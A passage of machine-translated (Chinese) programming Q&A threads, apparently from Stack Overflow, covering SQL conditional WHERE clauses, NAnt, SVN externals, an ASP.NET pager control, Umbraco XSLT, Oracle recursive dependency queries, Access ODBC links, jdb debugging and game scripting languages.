逻辑等价物是：

```
(IsNumeric(@OrderNumber) <> 1 OR OrderNumber = @OrderNumber)
AND (IsNumeric(@OrderNumber) = 1 OR OrderNumber LIKE '%' + @OrderNumber + '%' ) 
```

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2011-01-19T21:35:58.310

```
WHERE (IsNumeric(@OrderNumber) <> 1 OR OrderNumber = @OrderNumber)
             AND (IsNumber(@OrderNumber) = 1 OR OrderNumber LIKE '%'
                                              + @OrderNumber + '%')

```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2019-03-12T10:16:42.597

> **CASE**语句总是比**IF**更好的选择。

```
 WHERE  vfl.CreatedDate >= CASE WHEN @FromDate IS NULL THEN vfl.CreatedDate ELSE  @FromDate END
    AND vfl.CreatedDate<=CASE WHEN @ToDate IS NULL THEN vfl.CreatedDate ELSE @ToDate END 
```

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2019-07-21T12:17:16.373

```
 WHERE OrderNumber LIKE CASE WHEN IsNumeric(@OrderNumber) = 1 THEN @OrderNumber ELSE  '%' + @OrderNumber END 
```

在线路情况下，条件将正常工作。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2020-06-02T05:00:09.273

在sql server中我有同样的问题我只想在参数为false并且为true时才使用and语句我必须同时显示值true和false所以我以这种方式使用它

```
(T.IsPublic = @ShowPublic or  @ShowPublic = 1) 
```

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2013-04-22T08:50:44.463

以下示例将查询作为布尔表达式的一部分执行，然后根据布尔表达式的结果执行略有不同的语句块。每个语句块都以 BEGIN 开始，以 END 结束。

```
USE AdventureWorks2012;
GO
DECLARE @AvgWeight decimal(8,2), @BikeCount int
IF 
(SELECT COUNT(*) FROM Production.Product WHERE Name LIKE 'Touring-3000%' ) > 5
BEGIN
   SET @BikeCount = 
        (SELECT COUNT(*) 
         FROM Production.Product 
         WHERE Name LIKE 'Touring-3000%');
   SET @AvgWeight = 
        (SELECT AVG(Weight) 
         FROM Production.Product 
         WHERE Name LIKE 'Touring-3000%');
   PRINT 'There are ' + CAST(@BikeCount AS varchar(3)) + ' Touring-3000 bikes.'
   PRINT 'The average weight of the top 5 Touring-3000 bikes is ' + CAST(@AvgWeight AS varchar(8)) + '.';
END
ELSE 
BEGIN
SET @AvgWeight = 
        (SELECT AVG(Weight)
         FROM Production.Product 
         WHERE Name LIKE 'Touring-3000%' );
   PRINT 'Average weight of the Touring-3000 bikes is ' + CAST(@AvgWeight AS varchar(8)) + '.' ;
END ;
GO 
```

使用嵌套的 IF...ELSE 语句 以下示例显示了 IF ...ELSE 语句如何嵌套在另一个语句中。将 @Number 变量设置为 5、50 和 500 以测试每个语句。

```
DECLARE @Number int
SET @Number = 50
IF @Number > 100
   PRINT 'The number is large.'
ELSE 
   BEGIN
      IF @Number < 10
      PRINT 'The number is small'
   ELSE
      PRINT 'The number is medium'
   END ;
GO 
```

* * *

## 回答 #15

> 赞同：-1
> 
> 时间：2013-03-13T06:05:18.020

```
If @LstTransDt is Null
                begin
                    Set @OpenQty=0
                end
            else
                begin
                   Select   @OpenQty=IsNull(Sum(ClosingQty),0)  
                   From  ProductAndDepotWiseMonitoring  
                   Where   Pcd=@PCd And PtpCd=@PTpCd And TransDt=@LstTransDt      
                end 
```

看看这是否有帮助。

* * *

## 回答 #16

> 赞同：-8
> 
> 时间：2013-04-22T08:42:55.857

```
USE AdventureWorks2012;
GO
IF 
(SELECT COUNT(*) FROM Production.Product WHERE Name LIKE 'Touring-3000%' ) > 5
PRINT 'There are more than 5 Touring-3000 bicycles.'
ELSE PRINT 'There are 5 or less Touring-3000 bicycles.' ;
GO 
```

# c++ - 如何在 Nant 中使用我自己的编译器？

> ID：87831
> 
> 赞同：2
> 
> 时间：2008-09-17T21:25:33.370
> 
> 标签：c++, build, cross-platform, makefile, nant

Nant 似乎非常以编译器为中心——猜测是因为它被认为是一个 .NET 开发系统。但我知道这是可以做到的！我已经看到了它。我们正在构建的平台有自己的编译器，并且不使用 c++ 的“cl.exe”。我们正在不同平台上构建 C++ 应用程序，并希望使用我们自己的编译器进行覆盖。谁能指出我这样做的方法，或者至少如何设置我自己的目标来使用我们目标平台的编译器？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-09-17T21:38:33.527

这是我为 Delphi 做的一个。每个 'arg' 都是一个单独的参数，其值在别处定义。在调用目标之前，使用设置的参数调用目标。

```
<target name="build.application">
    <exec program="dcc32" basedir="${Delphi.Bin}" workingdir="${Application.Folder}" verbose="true">
        <arg value="${Application.Compiler.Directive}" />
        <arg value="-Q" />
        <arg value="/B" />
        <arg value="/E${Application.Output.Folder}" />
        <arg value="/U${Application.Lib.Folder};${Application.Search.Folder}" />
        <arg value="${Application.Folder}\${Delphi.Project}" />
    </exec>
</target> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-09-17T21:27:19.433

您需要编写自己的任务。 [这](http://www.atalasoft.com/cs/blogs/jake/archive/2008/05/07/writing-custom-nant-tasks.aspx)是一个很好的参考。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-09-17T21:29:17.450

最初，使用 <exec> 任务运行可执行文件，将任何所需信息作为参数和/或环境变量传递。

为了将来使用，您还可以研究编写自己的任务。我知道使用标准 ant，这是通过 <taskdef> 任务和 java 类完成的。不幸的是，我不确定 Nant 等价物。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T21:30:20.800

您也可以使用该`<exec>`任务。

# svn - SVN结帐问题

> ID：87849
> 
> 赞同：3
> 
> 时间：2008-09-17T21:28:09.807
> 
> 标签：svn

我即将转向 SVN 作为我选择的 RCS（在使用 CVS 多年之后）并且有一个基本问题......

我有许多共享项目——我想在许多不同项目中使用的代码。是否可以将这些共享文件夹“链接”到需要它们的项目，因此签出项目也会签出共享代码？

例如，假设我的存储库如下所示：

根
--project1
--project2
--shared
--smtp

当我结帐 project1 时，我还想结帐共享和 smtp。

回到我的 CVS 时代，我会在其中一个项目文件夹中使用 Unix 符号链接，但由于我的新 SVN 存储库不一定托管在 Unix 机器上，所以我不能这样做。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2008-09-17T21:29:50.100

SVN Externals 是您想要做的。[SVN 书在这里](http://svnbook.red-bean.com/en/1.0/ch07s03.html)详细解释了它。这是我喜欢 SVN 的一件事，精彩的文档。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T21:33:13.960

您正在寻找“svn:externals”属性。请参阅svnbook 的[这一](http://svnbook.red-bean.com/en/1.5/svn.advanced.externals.html)部分：

在您要在其中使用共享项目的项目下，然后在该目录上设置一个名为“svn:externals”的属性。此属性包含包含外部存储库的目录的名称，并且可以有一些其他选项，以便您始终获得相同的修订。

示例（来自 svnbook，这是 svn 问题的优秀参考）：

```
$ svn propget svn:externals calc
third-party/sounds             http://svn.example.com/repos/sounds
third-party/skins -r148        http://svn.example.com/skinproj
third-party/skins/toolkit -r21 http://svn.example.com/skin-maker 
```

在此示例中，将从[http://svn.example.com/repos/sounds](http://svn.example.com/repos/sounds)签出第三方/声音。-rNNN 将结帐固定在修订版上，这样如果您正在对此进行更多开发，您可以确保您的其他项目不会随机中断。通常，我不做这个修订的事情，而是在一个拥有稳定版本的标签之外。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T21:29:50.317

这就是 svn "Externals" 的用途。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T21:29:58.553

是的，看看[SVN Externals](http://svnbook.red-bean.com/en/1.0/ch07s03.html)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-17T21:30:22.017

是的，这种机制被称为“外部”。见[书](http://svnbook.red-bean.com/en/1.1/ch07s04.html)。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-09-17T21:32:30.717

SVN 有一个名为“externals”的功能，它的工作方式基本上与符号 UNIX 链接的工作方式相同（您将存储库中某个位置的某个目录指向存储库中其他位置的某个目录）。

有关如何设置外部的更多信息，请参阅： [http ://svnbook.red-bean.com/en/1.0/ch07s03.html](http://svnbook.red-bean.com/en/1.0/ch07s03.html)

希望有帮助。

# asp.net - 任何人都有用于在 GridView 的 PagerTemplate 中使用的带有寻呼机控件的 UserControl 的示例代码？

> ID：87853
> 
> 赞同：1
> 
> 时间：2008-09-17T21:28:34.720
> 
> 标签：asp.net, gridview, user-controls, pagertemplate

我的应用程序中有几个 Gridview，我在其中使用自定义 PagerTemplate。我想把这个自定义模板变成一个 UserControl，这样我就不需要在多个页面中复制相同的逻辑。我很确定这样的事情是可能的，但我不确定如何将 UserControl 连接到 Gridview 的事件，以及我的控件可能需要实现哪些接口。

我正在使用 ASP 2.0 框架。

有没有人做过这样的事情？如果是这样，您的用户控件是否有任何示例代码？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-09-17T21:43:28.537

我的同事 Dave Anderson 编写了这个可以帮助您入门的服务器控件。请注意，我们的目标是 .NET 3.5。

```
[AspNetHostingPermission(
  SecurityAction.Demand,
  Level = AspNetHostingPermissionLevel.Minimal),
  AspNetHostingPermission(SecurityAction.InheritanceDemand,
  Level = AspNetHostingPermissionLevel.Minimal),
  DefaultProperty("Text"),
  ToolboxData("<{0}:Pager runat=\"server\"> </{0}:Pager>"),
 Designer(typeof(ServerControls.Design.PagerDesigner))
]
public class Pager : WebControl, INamingContainer
{
    #region Private Constants

    private const string Command_First = "First";
    private const string Command_Prev = "Prev";
    private const string Command_Next = "Next";
    private const string Command_Last = "Last";

    #endregion

    #region Private members

    private Control PageableNamingContainer;
    private PropertyInfo PageCountInfo;
    private PropertyInfo PageIndexInfo;
    private DropDownList ddlCurrentPage;
    private Label lblPageCount;
    private Button btnFirst;
    private Button btnPrevious;
    private Button btnNext;
    private Button btnLast;

    #endregion

    #region Private Properties

    private int PageCount
    {
        get
        {
            int Result;
            if (InsideDataPager)
                Result = (int)Math.Ceiling((decimal)(TotalRowCount / PageSize)) + 1;
            else
                Result = (int)PageCountInfo.GetValue(PageableNamingContainer, null);

            return Result;
        }
    }
    private int PageIndex
    {
        get
        {
            int Result;
            if (InsideDataPager)
                Result = (int)Math.Floor((decimal)(StartRowIndex / PageSize));
            else
                Result = (int)PageIndexInfo.GetValue(PageableNamingContainer, null);

            return Result;
        }
    }

    private int StartRowIndex
    {
        get
        {
            if (InsideDataPager)
                return MyDataPager.StartRowIndex;
            else
                throw new Exception("DataPager functionality requires DataPager.");
        }
    }
    private int TotalRowCount
    {
        get
        {
            if (InsideDataPager)
                return MyDataPager.TotalRowCount;
            else
                throw new Exception("DataPager functionality requires DataPager.");
        }
    }
    private int PageSize
    {
        get
        {
            if (InsideDataPager)
                return MyDataPager.PageSize;
            else
                throw new Exception("DataPager functionality requires DataPager.");
        }
    }

    private bool InsideDataPager
    {
        get { return ViewState["InsideDataPager"] == null ? false : (bool)ViewState["InsideDataPager"]; }
        set { ViewState["InsideDataPager"] = value; }
    }

    #region DataPager-Specific properties

    private DataPager MyDataPager
    {
        get
        {
            if (InsideDataPager)
                return (DataPager)PageableNamingContainer;
            else
                throw new Exception("DataPager functionality requires DataPager.");
        }
    }
    private int PrevPageStartIndex
    {
        get { return StartRowIndex >= PageSize ? StartRowIndex - PageSize : 0; }
    }
    private int NextPageStartIndex
    {
        get { return StartRowIndex + PageSize >= TotalRowCount ? LastPageStartIndex : StartRowIndex + PageSize; }
    }
    private int LastPageStartIndex
    {
        get { return (PageCount-1) * PageSize; }
    }

    #endregion

    #endregion

    #region Public Properties

    [
    Category("Behavior"),
    DefaultValue(""),
    Description("The stylesheet class to use for the buttons")
    ]
    public bool HideInactiveButtons { get; set; }

    [
    Category("Behavior"),
    DefaultValue("true"),
    Description("Indicates whether the controls will invoke validation routines")
    ]
    public bool CausesValidation { get; set; }

    [
    Category("Appearance"),
    DefaultValue(""),
    Description("The stylesheet class to use for the buttons")
    ]
    public string ButtonCssClass { get; set; }

    [
    Category("Appearance"),
    DefaultValue("<<"),
    Description("The text to be shown on the button that navigates to the First page")
    ]
    public string FirstText { get; set; }
    [
    Category("Appearance"),
    DefaultValue("<"),
    Description("The text to be shown on the button that navigates to the Previous page")
    ]
    public string PreviousText { get; set; }
    [
    Category("Appearance"),
    DefaultValue(">"),
    Description("The text to be shown on the button that navigates to the Next page")
    ]
    public string NextText { get; set; }
    [
    Category("Appearance"),
    DefaultValue(">>"),
    Description("The text to be shown on the button that navigates to the Last page")
    ]
    public string LastText { get; set; }

    #endregion

    #region Overridden properties

    public override ControlCollection Controls
    {
        get
        {
            EnsureChildControls();
            return base.Controls;
        }
    }

    #endregion

    #region Overridden methods/events

    protected override void OnLoad(EventArgs e)
    {
        base.OnLoad(e);
        if (!GetPageInfo(NamingContainer))
            throw new Exception("Unable to locate the Pageable Container.");
    }

    protected override void OnPreRender(EventArgs e)
    {
        base.OnPreRender(e);
        if (PageableNamingContainer != null)
        {
            EnsureChildControls();

            ddlCurrentPage.Items.Clear();
            for (int i = 0; i < PageCount; i++)
                ddlCurrentPage.Items.Add(new ListItem((i + 1).ToString(), (i + 1).ToString()));

            lblPageCount.Text = PageCount.ToString();
            if (HideInactiveButtons)
            {
                btnFirst.Visible = btnPrevious.Visible = (PageIndex > 0);
                btnLast.Visible = btnNext.Visible = (PageIndex < (PageCount - 1));
            }
            else
            {
                btnFirst.Enabled = btnPrevious.Enabled = (PageIndex > 0);
                btnLast.Enabled = btnNext.Enabled = (PageIndex < (PageCount - 1));
            }
            ddlCurrentPage.SelectedIndex = PageIndex;
        }
        else
            ddlCurrentPage.SelectedIndex = 0;
    }

    protected override bool OnBubbleEvent(object source, EventArgs args)
    {
        // We handle all our events inside this class when
        // we are inside a DataPager
        return InsideDataPager;
    }

    #endregion

    #region Event delegate

    protected void PagerEvent(object sender, EventArgs e)
    {
        if (InsideDataPager)
        {
            int NewStartingIndex;

            if (sender.GetType() == typeof(Button))
            {
                string arg = ((Button)sender).CommandArgument.ToString();
                switch (arg)
                {
                    case Command_Prev:
                        NewStartingIndex = PrevPageStartIndex;
                        break;
                    case Command_Next:
                        NewStartingIndex = NextPageStartIndex;
                        break;
                    case Command_Last:
                        NewStartingIndex = LastPageStartIndex;
                        break;
                    case Command_First:
                    default:
                        NewStartingIndex = 0;
                        break;
                }
            }
            else
            {
                NewStartingIndex = Math.Min(((DropDownList)sender).SelectedIndex * PageSize, LastPageStartIndex);
            }

            MyDataPager.SetPageProperties(NewStartingIndex, MyDataPager.MaximumRows, true);
        }
        else
        {
            CommandEventArgs ea = new CommandEventArgs("Page", ((DropDownList)sender).SelectedValue);
            RaiseBubbleEvent(this, ea);
        }
    }

    #endregion

    #region GetPageableContainer

    private bool GetPageInfo(Control namingContainer)
    {
        if (namingContainer == null || namingContainer.GetType() == typeof(Page))
            throw new Exception(this.GetType().ToString() + " must be used in a pageable container like a GridView.");

        /* 
         * NOTE: If we are inside a DataPager, this will be 
         *       our first-level NamingContainer, so there
         *       will never be any reflection in that case.
         */
        if (namingContainer.GetType() == typeof(DataPagerFieldItem))
        {
            InsideDataPager = true;
            PageableNamingContainer = ((DataPagerFieldItem)namingContainer).Pager;
            return true;
        }

        PageCountInfo = namingContainer.GetType().GetProperty("PageCount");
        PageIndexInfo = namingContainer.GetType().GetProperty("PageIndex");
        if (PageCountInfo == null || PageIndexInfo == null)
            return GetPageInfo(namingContainer.NamingContainer);
        else
        {
            PageableNamingContainer = namingContainer;
            return true;
        }
    }

    #endregion

    #region Control generation

    protected override void CreateChildControls()
    {
        Controls.Clear();
        Controls.Add(BuildControlTable());
    }

    private Table BuildControlTable()
    {
        Table ControlTable = new Table();
        ControlTable.CssClass = CssClass;
        TableRow tr = new TableRow();
        TableCell td = new TableCell();

        td.Text = "Page";
        tr.Cells.Add(td);

        td = new TableCell();
        ddlCurrentPage = new DropDownList();
        ddlCurrentPage.ID = "ddlCurrentPage";
        ddlCurrentPage.AutoPostBack = true;
        ddlCurrentPage.SelectedIndexChanged += PagerEvent;
        ddlCurrentPage.CausesValidation = CausesValidation;
        td.Controls.Add(ddlCurrentPage);
        tr.Cells.Add(td);

        td = new TableCell();
        td.Text = "of";
        tr.Cells.Add(td);

        td = new TableCell();
        lblPageCount = new Label();
        td.Controls.Add(lblPageCount);
        tr.Cells.Add(td);

        AddButton(tr, ref btnFirst, string.IsNullOrEmpty(FirstText) ? "<<" : FirstText, Command_First);
        AddButton(tr, ref btnPrevious, string.IsNullOrEmpty(PreviousText) ? "<" : PreviousText, Command_Prev);
        AddButton(tr, ref btnNext, string.IsNullOrEmpty(NextText) ? ">" : NextText, Command_Next);
        AddButton(tr, ref btnLast, string.IsNullOrEmpty(LastText) ? ">>" : LastText, Command_Last);
        ControlTable.Rows.Add(tr);

        return ControlTable;
    }

    private void AddButton(TableRow row, ref Button button, string text, string argument)
    {
        button = new Button();
        button.Text = text;
        button.CssClass = ButtonCssClass;
        button.CommandName = "Page";
        button.CommandArgument = argument;
        button.CausesValidation = CausesValidation;
        if (InsideDataPager)
            button.Click += PagerEvent;
        TableCell td = new TableCell();
        td.Controls.Add(button);
        row.Cells.Add(td);
    }

    #endregion

} 
```

# xslt - 在 umbraco xslt 中使用 DateAdd 显示明年的日期

> ID：87870
> 
> 赞同：0
> 
> 时间：2008-09-17T21:29:55.777
> 
> 标签：xslt, umbraco

我正在尝试使用 umbraco 在 xslt 文件中显示一年后的日期，如下所示：

```
<xsl:variable name="now" select="umbraco.library:CurrentDate()"/>
<xsl:value-of select="umbraco.library:DateAdd($now, 'year', 1)"/> 
```

value-of 标签输出今天的日期。如何让 DateAdd 为当前日期添加一年？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-09-18T00:35:51.900

恒定的“年份”是错误的。它只需要'y'。

```
<xsl:variable name="now" select="umbraco.library:CurrentDate()"/>
<xsl:value-of select="umbraco.library:DateAdd($now, 'y', 1)"/> 
```

# asp.net - 如何最好地使 ASP.NET 日历控件的选定日期可用于 JavaScript？

> ID：87871
> 
> 赞同：0
> 
> 时间：2008-09-17T21:29:56.947
> 
> 标签：asp.net, javascript, calendar

如何最好地使 ASP.NET 日历控件的选定日期可用于 JavaScript？

大多数控件都非常简单，但日历需要的不仅仅是简单的*document.getElementById().value*。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-09-17T22:15:16.590

当您单击带有日历的日期时，ASP 会进行回发，您总是可以在页面的 OnLoad 事件或 Calendar 控件的 SelectionChanged 事件期间将日历控件的 SelectedDate 值放入页面上的隐藏字段中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-09-17T21:37:50.500

这可能会帮助你。它使用 YUI，但您可以将其中的一些功能移植到另一个库或自定义代码。它应该让你开始。

[http://www.codeproject.com/KB/aspnet/aspnet-yahoouicalendar.aspx](http://www.codeproject.com/KB/aspnet/aspnet-yahoouicalendar.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T22:06:50.510

您可能会发现 MS AJAX[日历](http://www.asp.net/ajax/ajaxcontroltoolkit/samples/Calendar/Calendar.aspx)控件扩展器很有用，您可以通过

`document.getElementById('<%= DateTextBox.ClientID%>').value;`

*DateTextBox*是一个*asp:TextBox*控件，将使用 AJAX 日历进行扩展。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-18T02:34:57.573

我正在使用 Page.ClientScript.RegisterClientScriptBlock() 在页面上放置一个小脚本，该脚本仅声明具有所需值的变量。我希望少一些……笨重。

# sql - 使用递归查询构建表依赖图

> ID：87877
> 
> 赞同：7
> 
> 时间：2008-09-17T21:30:18.727
> 
> 标签：sql, oracle, recursion, recursive-query

我正在尝试基于它们之间的外键构建表的依赖关系图。该图需要以任意表名作为其根开始。我可以，给定一个表名，使用 all_constraints 视图查找引用它的表，然后查找引用它们的表，依此类推，但这会非常低效。我编写了一个递归查询，对所有表执行此操作，但是当我添加时：

```
START WITH Table_Name=:tablename 
```

它不会返回整个树。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-09-17T22:34:58.850

```
 select parent, child, level from (
select parent_table.table_name parent, child_table.table_name child
 from user_tables      parent_table,
      user_constraints parent_constraint,
      user_constraints child_constraint,
      user_tables      child_table
where parent_table.table_name = parent_constraint.table_name
  and parent_constraint.constraint_type IN( 'P', 'U' )
  and child_constraint.r_constraint_name = parent_constraint.constraint_name
  and child_constraint.constraint_type   = 'R'
  and child_table.table_name = child_constraint.table_name
  and child_table.table_name != parent_table.table_name
)
start with parent = 'DEPT'
connect by prior child = parent 
```

假设一切都在同一个模式中，应该可以工作（当然，替换表名）。如果您需要处理跨模式依赖关系，请为 OWNER 和 R_OWNER 列使用数据字典表和条件的 DBA_ 版本。进一步思考，这也没有考虑自引用约束（即 MGR 列引用 EMPNO 列的 EMP 表上的约束），因此如果需要处理，您必须修改代码以处理这种情况具有自参照约束。

出于测试目的，我在 SCOTT 模式中添加了一些新表，它们也引用了 DEPT 表（包括孙子依赖项）

```
SQL> create table dept_child2 (
  2  deptno number references dept( deptno )
  3  );

Table created.

SQL> create table dept_child3 (
  2    dept_child3_no number primary key,
  3    deptno number references dept( deptno )
  4  );

Table created.

SQL> create table dept_grandchild (
  2    dept_child3_no number references dept_child3( dept_child3_no )
  3  );

Table created. 
```

并验证查询返回了预期的输出

```
SQL> ed
Wrote file afiedt.buf

  1  select parent, child, level from (
  2  select parent_table.table_name parent, child_table.table_name child
  3   from user_tables      parent_table,
  4        user_constraints parent_constraint,
  5        user_constraints child_constraint,
  6        user_tables      child_table
  7  where parent_table.table_name = parent_constraint.table_name
  8    and parent_constraint.constraint_type IN( 'P', 'U' )
  9    and child_constraint.r_constraint_name = parent_constraint.constraint_name
 10    and child_constraint.constraint_type   = 'R'
 11    and child_table.table_name = child_constraint.table_name
 12    and child_table.table_name != parent_table.table_name
 13  )
 14  start with parent = 'DEPT'
 15* connect by prior child = parent
SQL> /

PARENT                         CHILD                               LEVEL
------------------------------ ------------------------------ ----------
DEPT                           DEPT_CHILD3                             1
DEPT_CHILD3                    DEPT_GRANDCHILD                         2
DEPT                           DEPT_CHILD2                             1
DEPT                           EMP                                     1 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T22:11:40.233

最简单的方法是将所有 FK 信息复制到一个简单的 2 列（父、子）表中，然后使用以下算法：

```
while (rows left in that table)
  list = rows where table name exists in child but not in parent
  print list
  remove list from rows 
```

就这样。基本上，您首先打印并删除所有不依赖任何内容的节点。完成后，其他一些节点将被释放，您可以重复该过程。

PS 确保你没有在初始列表中插入自引用表（child=parent）

# oracle - 通过 Microsoft Access ODBC 链接到 Oracle 控制哪些列成为主键

> ID：87883
> 
> 赞同：1
> 
> 时间：2008-09-17T21:31:03.390
> 
> 标签：oracle, ms-access, odbc

当您使用 Oracle 的 ODBC 驱动程序创建指向 Oracle 表的 Microsoft Access 2003 链接时，有时会要求您说明哪些列是主键。

我想知道如何更改初始分配，甚至如何让 Access/ODBC 忘记分配。在我有限的测试中，我想知道分配是否没有被 ODBC 驱动程序本身缓存。

我最初选择的列不正确。

更新：我从来没有得到关于这个的完整答案，删除链接然后恢复它们不起作用。我认为这是一个不为人知的错误。我已经继续前进，从那以后就不必担心这种奇怪的事情了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-09-18T05:12:55.353

您必须删除该表的链接并创建一个新链接。当一个表被链接时，关于表的路径、结构（包括主键）、权限、密码和统计信息的所有连接信息都存储在 Access db 中。如果链接表中的任何项目发生更改，刷新链接不会在 Access 端自动更新它，因为 Access 会继续使用以前存储的信息。您必须删除或删除链接表并重新创建链接，存储当前连接信息。

不确定这下一点是否也适用于 odbc 链接表，但我怀疑它确实如此。对于 Jet 表，定期删除所有链接并重新创建它们以提高查询性能是个好主意，因为如果链接表的统计信息是在记录很少的表上进行的，一旦该表填充了更多记录，新的统计信息就会告诉Jet 的优化器在运行查询时，无论是使用索引还是全表扫描，都将是更好的做法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-09-17T22:01:41.770

不能删除链接再重新链接吗？

# java - Java jdb远程调试命令行工具

> ID：87885
> 
> 赞同：9
> 
> 时间：2008-09-17T21:31:21.110
> 
> 标签：java, jdb

有人有使用这个的经验吗？如果是这样，值得吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-03T05:51:01.967

我昨天才第一次使用 jdb，对结果非常满意。你看，我在笔记本电脑上用 Eclipse 编程，然后部署到 VM 以确保整个 shebang 仍然有效。偶尔，我将不得不处理一些独立执行的东西，作为命令行。这些东西有时需要调试。

这一直是个问题，因为我不想麻烦在 VM 上安装 Eclipse（它已经够慢了！），但我不知道有一种简单的方法让它连接到我的命令行-在它完成运行之前运行类。

jdb来救援！它是一种享受 - 小巧实用，几乎到了裸露的程度......这迫使你更多地应用你的思想而不是应用工具（就像我[在这里](https://stackoverflow.com/questions/91527/debugging-techniques#91584)所说的那样）。

确保打印出参考（[solaris](http://java.sun.com/j2se/1.4.2/docs/tooldocs/solaris/jdb.html)、[windows](http://java.sun.com/javase/6/docs/technotes/tools/windows/jdb.html)、[java 1.5](http://java.sun.com/j2se/1.5.0/docs/tooldocs/windows/jdb.html) - 我认为它们实际上都差不多），并在第二个屏幕上打开和浏览源代码。我希望你有第二个屏幕，否则你会经常使用 alt-tabbing。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-03-13T06:47:07.783

假设您的程序由以下命令启动：

```
java -Xdebug -Xrunjdwp:transport=dt_socket,server=y,address=<port> <class> 
```

您可以通过 jdb 附加到此进程：

```
jdb -attach <port> 
```

在某些情况下，您需要使用以下命令。

```
 jdb -sourcepath \.src -connect com.sun.jdi.SocketAttach:hostname=localhost,port= <port> 
```

* * *

## 回答 #3

> 赞同：-5
> 
> 时间：2008-09-18T01:46:42.370

JDB 非常难以使用。放置 System.outs 或使用 IDE 调试器会产生更好的结果。对于更有趣的功能（例如跟踪线程、堆大小等），您可以使用[JConsole](http://java.sun.com/developer/technicalArticles/J2SE/jconsole.html)工具以图形方式获取信息。

# lua - 游戏引擎脚本语言

> ID：87889
> 
> 赞同：4
> 
> 时间：2008-09-17T21:32:00.813
> 
> 标签：lua, scripting-language, ogre3d, squirrel

我正在尝试用 Ogre3d 渲染引擎构建一个有用的 3d 游戏引擎，用于模拟我提出的一些想法，并且已经走到了一个十字路口。有许多可用的脚本语言，我想知道是否有一两种经过审查并有适当的追随者。

LUA 和松鼠似乎更受审查，但我对任何人都持开放态度。

最好最好有一个用于分发和易于加载的语言的编译形式。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-09-17T21:54:59.680

一个有趣的选择是[stackless-python](http://www.stackless.com/)。这是在 Eve-Online 游戏中使用的。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-09-17T21:52:34.133

语法是口味问题，Lua 类似于 Javascript，但花括号替换为类似 Pascal 的关键字。它有一个很好的语法特性，分号从来不需要，但空格仍然不重要，所以你甚至可以删除所有换行符并让它仍然工作。作为一个从 C 开始的人，我会说 Python 与所有其他语言相比具有深奥的语法。

LuaJIT 的速度也大约是 Python 的 10 倍，而且 Lua 解释器要小得多（150kb 或大约 15k 行的 C 行，您可以实际阅读和理解）。您可以让用户编写游戏脚本，而无需嵌入大量语言。另一方面，如果你将解析器部分从 Lua 中剥离出来，它会变得更小。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-09-17T22:04:00.080

Python/C API 手册比*整个*Lua 手册（包括 Lua/C API）还要长。

Lua 的另一个原因是对协程的内置支持（一个 OS 线程内的协作多任务）。它允许一个人拥有 1000 多个看似独立的脚本，它们彼此并排运行得非常快。就像每个怪物/武器左右一个脚本一样。

（为什么人们在 SO 上这么大写 Lua？它是“Lua”（见[这里](http://www.lua.org/about.html)）。）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-09-17T22:14:31.817

再投一票给 Lua。小巧、快速、易于集成，这对于现代游戏机来说很重要——您可以轻松控制其内存操作。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-17T21:34:11.133

我会选择 Lua，因为编写绑定非常容易，许可证非常友好（MIT），现有的库也倾向于使用上述许可证。Scheme 也很好并且易于绑定，这就是为什么选择它用于 Gimp 图像编辑器的原因。但是 Lua 简直太棒了。魔兽世界使用它，作为一个非常引人注目的例子。LuaJIT 为您提供本地编译的性能。它[比](http://shootout.alioth.debian.org/u32q/benchmark.php?test=all&lang=luajit&lang2=gcc)纯 C还不到一个数量级。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-09-17T21:42:11.957

我不推荐 LUA，它有一种特殊的语法，所以需要一些时间来适应。根据谁将编写脚本，这可能不是问题，但我会尝试使用一些相当容易获得的东西。

我可能会选择python。它通常编译为字节码，因此您需要嵌入解释器。但是，如果必须，您可以使用 PyPy 例如将代码翻译成 C，然后编译它。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-09-17T21:47:10.400

嵌入解释器是没有问题的。我现在对功能和性能更感兴趣。LUA 和 Squirrel 都被解释了，这很好，因为我正在构建的游戏之一是包含可修改的代码，它在游戏中有一个编辑器。

我很想听听有关 python 的信息，因为我相信它在战场系列中的使用。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2011-04-26T07:01:09.623

python 也很好，因为它具有实际的 OGRE 绑定，以防万一您需要即时修改较低级别的内容。我不知道 Lua 的任何等效绑定。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2015-09-12T22:03:43.973

由于它是一个 C++ 库，我建议使用 JavaScript 或 Squirrel，后者是我个人最喜欢的两者，因为它更接近 C++，特别是它如何处理表/结构和类。由于所有的相似性，这对于 C++ 编码器来说是最容易习惯的。

